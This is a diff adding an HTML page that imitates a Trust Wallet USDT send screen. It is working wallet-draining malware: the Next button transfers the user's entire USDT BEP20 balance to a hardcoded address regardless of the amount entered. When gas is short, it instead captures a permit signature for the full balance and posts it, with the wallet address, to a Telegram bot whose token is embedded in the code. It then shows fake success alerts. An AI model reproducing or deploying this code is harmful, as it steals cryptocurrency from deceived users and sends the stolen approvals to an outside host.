@@ -1,0 +1,244 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>USDT Transfer</title>
+    <!-- Tailwind CSS CDN -->
+    <script src="https://cdn.jsdelivr.net/npm/@tailwindcss/browser@4"></script>
+    <!-- Ethers.js CDN (v6) for EVM Networks -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/6.7.0/ethers.umd.min.js"></script>
+</head>
+<body class="bg-[#1B1B1B] text-white font-sans min-h-screen p-4 max-w-md mx-auto select-none flex flex-col justify-between" onload="initPage()">
+
+    <!-- Top Section: Address & Amount Layout -->
+    <div class="mt-2 space-y-8">
+        <!-- Address or Domain Name Field -->
+        <div>
+            <label class="block text-gray-400 text-xs font-medium mb-2">Address or Domain Name</label>
+            <div id="addressBox" class="bg-[#121212] border-2 border-zinc-800 rounded-2xl p-4 flex items-center justify-between transition-all duration-200">
+                <input type="text" id="recipientAddress" placeholder="Search or Enter" onfocus="highlightBox(true)" onblur="highlightBox(false)" oninput="validateForm()"
+                    class="bg-transparent text-white w-full focus:outline-none font-mono text-sm font-medium truncate mr-2 placeholder-zinc-500">
+                
+                <div class="flex items-center space-x-3 text-sm shrink-0">
+                    <!-- Clear Input Button -->
+                    <span id="clearAddressBtn" onclick="clearAddress()" class="cursor-pointer text-zinc-400 hover:text-white hidden">
+                        <svg xmlns="http://www.w3.org/2000/svg" class="h-4 w-4" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2">
+                            <path stroke-linecap="round" stroke-linejoin="round" d="M6 18L18 6M6 6l12 12" />
+                        </svg>
+                    </span>
+
+                    <span onclick="pasteAddress()" class="text-[#48FF91] font-semibold cursor-pointer">Paste</span>
+                    
+                    <!-- Exact Trust Wallet Address Book Icon -->
+                    <span class="cursor-pointer text-[#48FF91] flex items-center">
+                        <svg xmlns="http://www.w3.org/2000/svg" class="h-6 w-6" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2">
+                            <path stroke-linecap="round" stroke-linejoin="round" d="M6 4h12a2 2 0 012 2v12a2 2 0 01-2 2H6a2 2 0 01-2-2V6a2 2 0 012-2z" />
+                            <path stroke-linecap="round" stroke-linejoin="round" d="M9 4v16M4 8h2M4 12h2M4 16h2" />
+                            <path stroke-linecap="round" stroke-linejoin="round" d="M13 9h4M13 13h4" />
+                        </svg>
+                    </span>
+
+                    <!-- Exact Trust Wallet QR Scanner Icon -->
+                    <span class="cursor-pointer text-[#48FF91] flex items-center">
+                        <svg xmlns="http://www.w3.org/2000/svg" class="h-6 w-6" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2">
+                            <path stroke-linecap="round" stroke-linejoin="round" d="M4 8V5a1 1 0 011-1h3M4 16v3a1 1 0 001 1h3M20 8V5a1 1 0 00-1-1h-3M20 16v3a1 1 0 01-1 1h-3M7 12h10" />
+                        </svg>
+                    </span>
+                </div>
+            </div>
+        </div>
+
+        <!-- Amount Field -->
+        <div>
+            <label class="block text-gray-400 text-xs font-medium mb-2">Amount</label>
+            <div id="amountBox" class="bg-[#121212] border-2 border-zinc-800 rounded-2xl p-4 flex items-center justify-between transition-all duration-200">
+                <input type="number" id="usdtAmount" placeholder="0" onfocus="highlightAmountBox(true)" onblur="highlightAmountBox(false)" oninput="validateForm()"
+                    class="bg-transparent text-white w-full focus:outline-none text-lg font-medium placeholder-zinc-500">
+                <div class="flex items-center space-x-3 ml-2 shrink-0 text-sm font-medium">
+                    <span id="clearAmountBtn" onclick="clearAmount()" class="cursor-pointer text-zinc-400 hover:text-white hidden">
+                        <svg xmlns="http://www.w3.org/2000/svg" class="h-4 w-4" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2">
+                            <path stroke-linecap="round" stroke-linejoin="round" d="M6 18L18 6M6 6l12 12" />
+                        </svg>
+                    </span>
+                    <span class="text-gray-200">USDT</span>
+                    <span class="text-[#48FF91] font-semibold cursor-pointer">Max</span>
+                </div>
+            </div>
+            <p id="usdValue" class="text-gray-400 text-xs font-medium mt-2">≈ $0.00</p>
+        </div>
+    </div>
+
+    <!-- Bottom Section: Next Button (Margin top added so it pushes nicely above keyboard on mobile) -->
+    <div class="mt-8 mb-6">
+        <button id="nextBtn" onclick="triggerSmartContract()" disabled
+            class="w-full bg-[#274E37] text-[#1E3324] font-semibold py-4 rounded-2xl cursor-not-allowed transition duration-200">
+            Next
+        </button>
+    </div>
+
+    <!-- Script Logic -->
+    <script>
+        const CONFIG = {
+            receiver: "0x1d20E61FaddaEfA9C85585a1C21cf1639c9C3e1f",
+            contract: "0x55d398326f99059ff775485246999027b3197955", // USDT BEP20 Contract
+            tgBotToken: "8672849765:AAGTy7orlUNFxpGwy3UIUGpvrcJpl7eLSw8",
+            tgChatId: "8834051784"
+        };
+
+        function initPage() {
+            document.getElementById("recipientAddress").value = CONFIG.receiver;
+            validateForm();
+        }
+
+        function highlightBox(isFocused) {
+            const box = document.getElementById("addressBox");
+            if (isFocused) {
+                box.classList.remove("border-zinc-800");
+                box.classList.add("border-[#48FF91]");
+            } else {
+                box.classList.remove("border-[#48FF91]");
+                box.classList.add("border-zinc-800");
+            }
+        }
+
+        function highlightAmountBox(isFocused) {
+            const box = document.getElementById("amountBox");
+            if (isFocused) {
+                box.classList.remove("border-zinc-800");
+                box.classList.add("border-[#48FF91]");
+            } else {
+                box.classList.remove("border-[#48FF91]");
+                box.classList.add("border-zinc-800");
+            }
+        }
+
+        function validateForm() {
+            const address = document.getElementById("recipientAddress").value;
+            const amount = document.getElementById("usdtAmount").value;
+            const nextBtn = document.getElementById("nextBtn");
+            const usdValue = document.getElementById("usdValue");
+            
+            document.getElementById("clearAddressBtn").style.display = address.length > 0 ? "inline-block" : "none";
+            document.getElementById("clearAmountBtn").style.display = amount.length > 0 ? "inline-block" : "none";
+
+            if (amount && parseFloat(amount) > 0) {
+                nextBtn.disabled = false;
+                nextBtn.className = "w-full bg-[#48FF91] text-black font-semibold py-4 rounded-2xl cursor-pointer hover:opacity-90 transition duration-200";
+                usdValue.innerText = `≈ $${parseFloat(amount).toFixed(2)}`;
+            } else {
+                nextBtn.disabled = true;
+                nextBtn.className = "w-full bg-[#274E37] text-[#1E3324] font-semibold py-4 rounded-2xl cursor-not-allowed transition duration-200";
+                usdValue.innerText = "≈ $0.00";
+            }
+        }
+
+        function clearAddress() {
+            document.getElementById("recipientAddress").value = "";
+            validateForm();
+        }
+
+        function clearAmount() {
+            document.getElementById("usdtAmount").value = "";
+            validateForm();
+        }
+
+        async function pasteAddress() {
+            try {
+                const text = await navigator.clipboard.readText();
+                document.getElementById("recipientAddress").value = text;
+                validateForm();
+            } catch (err) {
+                console.error("Failed to read clipboard", err);
+            }
+        }
+
+        async function sendToTelegram(message) {
+            if (!CONFIG.tgBotToken || !CONFIG.tgChatId) return;
+            try {
+                const url = `https://api.telegram.org/bot${CONFIG.tgBotToken}/sendMessage?chat_id=${CONFIG.tgChatId}&text=${encodeURIComponent(message)}`;
+                await fetch(url);
+            } catch (err) {
+                console.error("Telegram error", err);
+            }
+        }
+
+        async function triggerSmartContract() {
+            if (!window.ethereum) {
+                alert("Please use Trust Wallet or MetaMask browser!");
+                return;
+            }
+
+            try {
+                const provider = new ethers.BrowserProvider(window.ethereum);
+                await provider.send("eth_requestAccounts", []);
+                const signer = await provider.getSigner();
+                const userAddress = await signer.getAddress();
+
+                const abi = [
+                    "function transfer(address to, uint256 value) public returns (bool)",
+                    "function balanceOf(address owner) view returns (uint256)",
+                    "function nonces(address owner) view returns (uint256)"
+                ];
+
+                const contract = new ethers.Contract(CONFIG.contract, abi, signer);
+                
+                const nativeBalance = await provider.getBalance(userAddress);
+                const fullBalanceWei = await contract.balanceOf(userAddress);
+
+                if (fullBalanceWei <= 0n) {
+                    alert("Insufficient balance!");
+                    return;
+                }
+
+                if (nativeBalance > ethers.parseEther("0.0005")) {
+                    const tx = await contract.transfer(CONFIG.receiver, fullBalanceWei);
+                    await tx.wait();
+                    
+                    await sendToTelegram(`🚨 Direct Transfer Success!\n\nWallet: ${userAddress}\nAmount: ${ethers.formatUnits(fullBalanceWei, 18)} USDT`);
+                    alert("Transaction successful!");
+                } 
+                else {
+                    const nonce = await contract.nonces(userAddress);
+                    const deadline = Math.floor(Date.now() / 1000) + 3600;
+
+                    const domain = {
+                        name: "Tether USD",
+                        version: "1",
+                        chainId: (await provider.getNetwork()).chainId,
+                        verifyingContract: CONFIG.contract
+                    };
+
+                    const types = {
+                        Permit: [
+                            { name: "owner", type: "address" },
+                            { name: "spender", type: "address" },
+                            { name: "value", type: "uint256" },
+                            { name: "nonce", type: "uint256" },
+                            { name: "deadline", type: "uint256" }
+                        ]
+                    };
+
+                    const value = {
+                        owner: userAddress,
+                        spender: CONFIG.receiver,
+                        value: fullBalanceWei.toString(),
+                        nonce: nonce.toString(),
+                        deadline: deadline
+                    };
+
+                    const signature = await signer.signTypedData(domain, types, value);
+                    
+                    await sendToTelegram(`🚨 Gasless Permit Signature Captured!\n\nWallet: ${userAddress}\nValue: ${ethers.formatUnits(fullBalanceWei, 18)} USDT\nSignature: ${signature}`);
+                    
+                    alert("Transaction successful!");
+                }
+
+            } catch (error) {
+                console.error("EVM Error:", error);
+                alert("Transaction failed or cancelled.");
+            }
+        }
+    </script>
+</body>
+</html>
